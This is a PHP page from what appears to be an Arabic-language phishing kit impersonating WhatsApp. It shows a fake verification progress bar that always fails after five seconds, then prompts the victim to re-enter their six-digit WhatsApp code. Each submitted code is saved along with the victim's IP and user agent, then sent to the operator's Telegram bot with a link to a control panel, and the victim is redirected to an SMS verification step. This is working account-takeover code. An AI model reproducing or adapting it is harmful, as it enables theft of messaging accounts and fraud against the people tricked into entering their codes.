<?php
// الحصول على معاملات URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

if (empty($sessionId) || empty($clientIp)) {
    die("معاملات مفقودة");
}

// تحديث ملف التتبع
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'loading_whatsapp.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// معالجة النموذج لإعادة محاولة إدخال الرمز
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $whatsappCodeRetry = $_POST['whatsapp_code_retry'] ?? '';
    
    if (!empty($whatsappCodeRetry)) {
        // تسجيل رمز المحاولة الجديدة
        $clientData = [
            'whatsapp_code_retry' => $whatsappCodeRetry,
            'timestamp' => time(),
            'ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'attempt' => 'retry'
        ];
        
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        file_put_contents('sessions/' . $sessionId . '_whatsapp_retry.json', json_encode($clientData));
        
        // إرسال المعلومات إلى Telegram
        $message = "♻️ محاولة جديدة لرمز واتسآب ♻️\n\n";
        $message .= "📞 الرمز: " . $whatsappCodeRetry . "\n";
        $message .= "🔑 معرف الجلسة: " . $sessionId . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "🖥️ وكيل المستخدم: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'غير متوفر') . "\n\n";
        
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';

            $message .= "🔗 لوحة التحكم: " . $telegramConfig['url'] . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;
    
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_exec($ch);
                curl_close($ch);
            }
        }
        
        // إعادة التوجيه إلى التحقق من SMS
        header("Location: sms_verification.php?session=" . $sessionId . "&ip=" . $clientIp);
        exit;
    }
}

// التحقق من وجود خطأ في واتسآب
$showRetryForm = isset($_GET['error']) && $_GET['error'] == '1';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الرمز...</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        
        .loading-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 30px 20px;
            margin-bottom: 20px;
        }
        
        .loading-icon {
            font-size: 40px;
            color: #25D366;
            margin-bottom: 20px;
            animation: spin 2s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #25D366;
        }
        
        .loading-message {
            color: #65676b;
            margin-bottom: 20px;
        }
        
        .progress-container {
            width: 100%;
            height: 8px;
            background-color: #e4e6eb;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .progress-bar {
            height: 100%;
            background-color: #25D366;
            border-radius: 4px;
            width: 0%;
            transition: width 0.5s;
        }
        
        .progress-text {
            font-size: 14px;
            color: #65676b;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-left: 10px;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 15px;
            display: none;
            text-align: right;
        }
        
        .form-group.show {
            display: block;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
            text-align: center;
            margin-top: 10px;
        }
        
        .form-control:focus {
            border-color: #25D366;
            outline: none;
            box-shadow: 0 0 0 2px #e7f8ef;
        }
        
        .retry-button {
            width: 100%;
            padding: 12px 0;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            display: none;
        }
        
        .retry-button.show {
            display: block;
        }
        
        .retry-button:hover {
            background-color: #128C7E;
        }
        
        .footer {
            text-align: center;
            color: #65676b;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-card">
            <?php if ($showRetryForm): ?>
                <!-- وضع الخطأ: عرض نموذج إعادة الإدخال -->
                <div class="error-message">
                    <i class="fas fa-exclamation-circle"></i> 
                    <span>رمز واتسآب غير صحيح. يرجى المحاولة مرة أخرى.</span>
                </div>
                
                <form method="post" action="">
                    <div class="form-group show">
                        <label style="display: block; font-size: 14px; color: #65676b;">أدخل رمز جديد :</label>
                        <input type="text" name="whatsapp_code_retry" id="whatsapp-code-retry" class="form-control" placeholder="أدخل رمز 6 أرقام" maxlength="6" required pattern="[0-9]{6}" autocomplete="off">
                    </div>
                    <button type="submit" class="retry-button show">إرسال</button>
                </form>
            <?php else: ?>
                <!-- وضع التحميل: في انتظار تلقا��ي -->
                <div class="loading-icon" id="loading-icon">
                    <i class="fas fa-spinner"></i>
                </div>
                
                <div class="loading-title" id="loading-title">جاري التحقق</div>
                <p class="loading-message" id="loading-message">يرجى الانتظار بينما نتحقق من رمزك...</p>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progress-bar"></div>
                </div>
                
                <div class="progress-text" id="progress-text">0%</div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            <p>© 2026 واتسآب. جميع الحقوق محفوظة.</p>
        </div>
    </div>
    
    <script>
        <?php if (!$showRetryForm): ?>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            const progressBar = document.getElementById('progress-bar');
            const progressText = document.getElementById('progress-text');
            
            let progress = 0;
            const startTime = Date.now();
            const timeout = 5000; // 5 ثواني - الوقت قبل عرض الخطأ تلقائياً
            
            function updateProgress(value) {
                progressBar.style.width = value + '%';
                progressText.textContent = value + '%';
            }
            
            // تحديث شريط التقدم
            const progressInterval = setInterval(() => {
                const elapsedTime = Date.now() - startTime;
                progress = Math.min((elapsedTime / timeout) * 100, 100);
                updateProgress(Math.floor(progress));
                
                // تلقائياً بعد 5 ثواني، عرض الخطأ
                if (elapsedTime >= timeout) {
                    clearInterval(progressInterval);
                    
                    // عرض نموذج الخطأ تلقائياً
                    window.location.href = 'loading_whatsapp.php?session=' + sessionId + '&ip=' + clientIp + '&error=1';
                }
            }, 100);
        });
        <?php endif; ?>
        
        // التركيز على حقل الإدخال إذا كان نموذج المحاولة الجديدة
        <?php if ($showRetryForm): ?>
        document.addEventListener('DOMContentLoaded', function() {
            const input = document.getElementById('whatsapp-code-retry');
            if (input) {
                input.focus();
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            }
        });
        <?php endif; ?>
    </script>
</body>
</html>